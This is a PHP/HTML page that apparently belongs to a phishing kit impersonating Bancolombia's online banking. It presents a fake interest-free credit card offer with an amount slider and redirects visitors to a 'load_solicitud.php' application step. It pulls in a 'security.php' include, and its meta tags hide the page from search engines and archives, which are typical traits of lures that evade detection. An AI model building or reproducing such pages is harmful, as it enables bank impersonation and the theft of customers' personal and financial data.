<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
	
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
<meta name="description" content="Selecciona tu cupo disponible. Bancolombia Sucursal Virtual Personas.">
<title>Seleccionar cupo disponible — Bancolombia</title>
<link rel="icon" type="image/svg+xml" href="favicon.svg">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #ffffff;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    min-height: 100dvh;
    padding: calc(20px + env(safe-area-inset-top)) 20px calc(20px + env(safe-area-inset-bottom));
    box-sizing: border-box;
}

:root {
    --accent: #ffd000;
    --accent-ink: #2c2a29;
    --accent-soft: rgba(255, 208, 0, 0.25);
    --panel: #f6f7fb;
    --range-fill: 0%;
}

/* Contenedor Principal (Flex Wrapper) */
.contenedor-principal {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    align-items: center;
    gap: 30px;
    width: 100%;
    max-width: 900px;
}

/* Contenedor Imagen */
.contenedor-imagen {
    flex: 1 1 300px;
    max-width: 400px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 12px;
}

.logo-superior img {
    width: 100%;
    max-width: 180px;
    height: auto;
    display: block;
}

.logo-superior {
    border-radius: 16px;
    padding: 10px 14px;
    background: linear-gradient(180deg, #ffffff, #f8f9fc);
    box-shadow: 0 8px 24px rgba(0,0,0,0.08);
    transform: translateY(8px) scale(0.96);
    opacity: 0;
    transition: transform 260ms ease, box-shadow 260ms ease;
    will-change: transform;
}

.logo-superior.is-ready {
    transform: translateY(0) scale(1);
    opacity: 1;
    animation: logoFloat 2.8s ease-in-out infinite;
}

@keyframes logoFloat {
    0%, 100% { transform: translateY(0) scale(1); }
    50% { transform: translateY(-4px) scale(1.01); }
}

.contenedor-imagen img {
    width: 100%;
    height: auto;
    border-radius: 16px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
}

/* Contenedor Contenido (Caja) */
.contenedor-contenido {
    flex: 1 1 300px;
    max-width: 420px;
}

.caja {
    background: var(--panel);
    padding: 26px;
    border-radius: 22px;
    box-shadow: 0 10px 30px rgba(17, 24, 39, 0.10);
    text-align: center;
    border: 1px solid rgba(17, 24, 39, 0.06);
}

.badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    padding: 10px 18px;
    border-radius: 999px;
    background: rgba(255, 208, 0, 0.18);
    color: #8a6b00;
    font-weight: 700;
    font-size: 18px;
    margin-bottom: 16px;
}

.titulo {
    font-size: clamp(24px, 3.8vw, 30px);
    font-weight: 800;
    margin: 6px 0 22px;
    color: #0f172a;
    line-height: 1.12;
}

input[type=range] {
    width: 100%;
    margin: 20px 0;
    cursor: pointer;
}

.label {
    text-align: left;
    font-size: 18px;
    font-weight: 800;
    color: #0f172a;
    margin: 10px 0 8px;
}

#slider {
    -webkit-appearance: none;
    appearance: none;
    height: 8px;
    border-radius: 999px;
    background:
        linear-gradient(var(--accent-soft), var(--accent-soft)) 0/var(--range-fill) 100% no-repeat,
        #efe7c6;
    outline: none;
}

#slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    appearance: none;
    width: 22px;
    height: 22px;
    border-radius: 999px;
    background: var(--accent);
    border: 5px solid #ffffff;
    box-shadow: 0 8px 18px rgba(0,0,0,0.18);
}

#slider::-moz-range-thumb {
    width: 22px;
    height: 22px;
    border-radius: 999px;
    background: var(--accent);
    border: 5px solid #ffffff;
    box-shadow: 0 8px 18px rgba(0,0,0,0.18);
}

#slider::-moz-range-track {
    height: 8px;
    border-radius: 999px;
    background: #efe7c6;
}

.cupo-box {
    margin-top: 10px;
    background: #ffffff;
    border: 1px solid rgba(15, 23, 42, 0.10);
    border-radius: 16px;
    padding: 18px 18px;
    text-align: left;
    box-shadow: 0 8px 18px rgba(17, 24, 39, 0.06);
}

.monto {
    font-size: clamp(24px, 4vw, 30px);
    font-weight: 900;
    color: #0f172a;
    margin: 0;
}

.aviso {
    font-size: 16px;
    color: #8a6b00;
    margin-top: 16px;
    line-height: 1.35;
    font-family: 'Poppins', sans-serif;
    font-weight: 400;
}

/* BOTÓN ESTILO BANCOLOMBIA */
.boton {
    margin-top: 25px;
    width: 100%;
    padding: 16px;
    background: var(--accent);
    border: none;
    border-radius: 16px;
    font-size: 18px;
    font-weight: 700;
    cursor: pointer;
    transition: background 0.3s;
    color: var(--accent-ink);
}

.boton:hover {
    background: #e6c620;
}

/* Ajustes móviles específicos */
@media (max-width: 768px) {
    body {
        align-items: flex-start;
        padding: calc(14px + env(safe-area-inset-top)) 14px calc(18px + env(safe-area-inset-bottom));
    }

    .contenedor-principal {
        flex-direction: column;
        gap: 16px;
        max-width: 520px;
    }
    
    .contenedor-imagen, .contenedor-contenido {
        max-width: 100%;
        width: 100%;
    }

    .logo-superior img {
        max-width: 160px;
    }

    .caja {
        padding: 20px;
        border-radius: 20px;
    }

    .badge {
        font-size: 16px;
        padding: 9px 16px;
        margin-bottom: 14px;
    }

    .label {
        font-size: 16px;
        margin: 10px 0 8px;
    }

    .cupo-box {
        padding: 16px 16px;
    }

    .aviso {
        font-size: 15px;
        margin-top: 14px;
    }

    .boton {
        padding: 14px;
        border-radius: 16px;
        font-size: 17px;
    }
}

@media (max-width: 420px) {
    .contenedor-imagen img {
        border-radius: 18px;
    }
}

@media (prefers-reduced-motion: reduce) {
    .logo-superior,
    .logo-superior.is-ready {
        transition: none;
        animation: none;
    }
}
</style>
</head>

<body>

<div class="contenedor-principal">

    <!-- ✅ CONTENEDOR IMAGEN -->
    <div class="contenedor-imagen">
        <div class="logo-superior" id="logo-superior">
            <img src="assets/images/logo-encabezado.svg" alt="Logo Bancolombia">
        </div>
        <img src="assets/images/amenta.png" alt="Tarjeta">
    </div>

    <!-- ✅ CONTENEDOR CONTENIDO -->
    <div class="contenedor-contenido">
        <div class="caja">

            <div class="badge">Crédito Bancolombia</div>

            <div class="titulo">
                Escoge el cupo ideal entre $5.000.000 y $30.000.000
            </div>

            <div class="label">Ajusta tu cupo</div>
            <input type="range" min="5000000" max="30000000" step="500000" value="5000000" id="slider" oninput="actualizar()">

            <div class="label">Cupo seleccionado</div>
            <div class="cupo-box">
                <div class="monto" id="valor">$5.000.000</div>
            </div>

            <div class="aviso">
                El cupo se asigna sin intereses mensuales.
            </div>

            <!-- ✅ BOTÓN QUE ENVÍA A OTRO INDEX -->
            <button class="boton" onclick="window.location.href='load_solicitud.php'">
                SOLICITAR TARJETA
            </button>

        </div>
    </div>

</div>

<script>
function actualizar() {
    const slider = document.getElementById("slider");
    const valor = Number(slider.value);
    document.getElementById("valor").innerText = "$" + valor.toLocaleString("es-CO");

    const min = Number(slider.min);
    const max = Number(slider.max);
    const pct = ((valor - min) * 100) / (max - min);
    document.documentElement.style.setProperty("--range-fill", `${pct}%`);
}

actualizar();


(function() {
    const logoCard = document.getElementById("logo-superior");
    if (!logoCard) return;

    requestAnimationFrame(() => {
        logoCard.classList.add("is-ready");
    });

    const canHover = window.matchMedia && window.matchMedia("(hover: hover)").matches;
    if (!canHover) return;

    logoCard.addEventListener("mousemove", function(e) {
        const rect = logoCard.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        const offsetX = (e.clientX - centerX) / rect.width;
        const offsetY = (e.clientY - centerY) / rect.height;

        const rotateY = offsetX * 8;
        const rotateX = -offsetY * 8;
        logoCard.style.transform = `perspective(700px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-2px)`;
        logoCard.style.boxShadow = "0 14px 30px rgba(0,0,0,0.12)";
    });

    logoCard.addEventListener("mouseleave", function() {
        logoCard.style.transform = "";
        logoCard.style.boxShadow = "";
    });
})();
</script>

</body>
</html>
